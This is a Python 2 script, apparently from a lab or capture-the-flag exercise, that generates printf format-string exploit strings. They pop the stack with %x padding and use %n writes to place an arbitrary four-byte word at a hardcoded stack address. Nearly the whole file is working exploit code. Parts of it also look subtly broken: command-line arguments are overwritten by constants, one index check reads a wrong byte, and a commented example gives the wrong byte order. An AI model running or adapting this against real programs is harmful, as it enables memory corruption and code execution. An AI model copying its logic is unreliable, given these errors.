'''
    n = result.read()
    Summary:
                Generates format strings for a printf exploit

    Input:
                fstr_offset     -   the byte offset of the format string from the stack address of the (would be) second argument to printf
                target_addr     -   the address of the 4 byte word that you want to overwrite
                target_word     -   an int32 of the bytes you want to write 
'''

import sys
import doctest
import pdb


#sys.stdout = sys.stderr

debug = False

if len(sys.argv) > 3:
    fstr_offset = int(sys.argv[1], 16)
    target_addr = int(sys.argv[2], 16)
    target_word = int(sys.argv[3], 16)

if len(sys.argv) > 1 and sys.argv[1] == '-d':
    debug = True
if len(sys.argv) > 4 and sys.argv[4] == '-d':
    debug = True

fstr_offset = 0x7 * 4 #memory offset (in bytes) from initial printf stack to format string mem loc
#target_addr = 0xbfff4746 #the address we are writing to
target_addr = 0xbfffd7dc #the address we are writing to
target_word = 0x41414141 #the 4 byte word that we are writing to the target address
payload_pad = '%.8x'

#print hex(fstr_offset)
#print hex(target_addr)
#print hex(target_word)

def main():
    global fstr_offset
    addr_bytes = get_bytes_little_endian(target_addr)
    target_n_values, overflows = target_int32_to_n_values(target_word)

    '''
            fs__target_addr_payload

            three parts:
                1. initial '_' padding to get format string aligned to words
                2. decreasing target addresses
                3. stack filler (gives us the ability later on to manipulate the value of n)

            note: we don't include stack filler before the first address because of our later trick of manipulating n inline to popping the stack
    '''
    if fstr_offset % 4 != 0:
        bpad = '_' * (4 - (fstr_offset % 4))
        fstr_offset += 1
    else:
        bpad = ''
    addrs = [bytelist_to_string(get_bytes_little_endian(target_addr + i)) for i in xrange(4)]
    fs__target_addr_payload = bpad + addrs[0]
    for i in xrange(1, 4):
        fs__target_addr_payload = fs__target_addr_payload + payload_pad + addrs[i]
        fstr_offset -= 4
    current_n = len(fs__target_addr_payload)



    '''
            fs__stackpop_offset
            
            two functions
                1. pop the stack until the beginning of the format string is pointed to
                2. manipulate in advance the first n value (kill two birds with one stone to allow for a shorter format string)
    '''

    doubles = (fstr_offset / 8)
    singles = (fstr_offset - doubles * 8) / 4
    dpops = ['%17Lx'] * doubles
    spops = ['%9x'] * singles
    remaining_n =  target_n_values[0] - (current_n - doubles * 17 - singles * 9)

    assert remaining_n > 0 and doubles > 0
    dpops[0] = '%' + str(remaining_n + 17) + 'Lx'
    fs__stackpop_offset = ''.join(dpops+spops)


    '''
        manipulate and write the n values (1 * 4 bytes = 4 times)

        the first n value has already been manipulated while popping the stack (saves space in our format string)
    '''
    fs__padding_chars1 = ''   #'%' + str(remaining_n) + 'x'
    fs__write_val1 = '%n' if not debug else '%p'
    current_n = current_n + remaining_n
    
    remaining_n = target_n_values[1]
    assert remaining_n >= 8
    fs__padding_chars2 = '%' + str(remaining_n) + 'x'
    fs__write_val2 = '%n' if not debug else '%p'
    current_n = current_n + remaining_n
    
    remaining_n = target_n_values[2]
    assert remaining_n >= 8
    fs__padding_chars3 = '%' + str(remaining_n) + 'x'
    fs__write_val3 = '%n' if not debug else '%p'
    current_n = current_n + remaining_n
    
    remaining_n = target_n_values[3]
    assert remaining_n >= 8
    fs__padding_chars4 = '%' + str(remaining_n) + 'x'
    fs__write_val4 = '%n' if not debug else '%p'

    write_parts =    ''.join((
                            fs__padding_chars1,
                            fs__write_val1,
                            fs__padding_chars2,
                            fs__write_val2,
                            fs__padding_chars3,
                            fs__write_val3,
                            fs__padding_chars4,
                            fs__write_val4
                            ))
    full_format_string =    ''.join((
                            fs__target_addr_payload,
                            fs__stackpop_offset,
                            write_parts 
                            ))
    
    assert not '\x00' in full_format_string
    assert not '\n' in full_format_string
    assert not '\r' in full_format_string
    
    #print fs__target_addr_payload
    #print fs__stackpop_offset,
    #print write_parts 
    if len(full_format_string) > 63 and not debug:
        raise Exception('len: %s' % len(full_format_string))
    #sys.stdout.write(full_format_string)
    print full_format_string
"""
#>>>map(lambda x: hex(x), get_bytes_little_endian(0x12345678))
#['0x12','0x34','0x56', '0x78']
"""
def get_bytes_little_endian(int32):
    int32 = int32 & 0xffffffff
    _bytes = []
    while (int32 != 0):
        _bytes.append(int32 & 0xff)
        int32 = int32 >> 8
    #_bytes.reverse()
    return _bytes

def bytelist_to_string(byte_list):
   return ''.join(map(lambda x: chr(x), byte_list))


'''
To write a specific byte, we make the format string output a specific number of characters, which is
written when the format string hits %n.  This number is equal to the value of the byte that we
want to write.  However, because the stored number of characters (which gets written using %n) doesn't decrease
over after each %n, have a special limitation: that %hhn must express the values we want but %n still increase
as the format string is consumed.


#>>>map(lambda x: hex(x & 0xff), target_int32_to_n_values(0x98345816)[0]) 
#['0x98', '0x34', '0x58', '0x16']
'''
def target_int32_to_n_values(int32):
    target_bytes = get_bytes_little_endian(int32)
    n_values = []
    overflows = [None, ] * 4
 
    n_values.append( target_bytes[0] )
    byte2 = 0
    for i in xrange(1,4):
        if target_bytes[i-2] > target_bytes[i-1]:
            byte2 = byte2 + 1
            n_values.append( (byte2 << 8) + target_bytes[i] )
            overflows[i] = True
        else:
            n_values.append(target_bytes[i] )
            overflows[i] = False

    return n_values,overflows


def to_string():
    from cStringIO import StringIO
    old_out = sys.stdout
    sys.stdout = result = StringIO()
    main()
    sys.stdout = old_out
    return result.getvalue()

if __name__ == '__main__':
    doctest.testmod()
    main()

#print [hex(x) for x in target_int32_to_n_values(target_addr)]


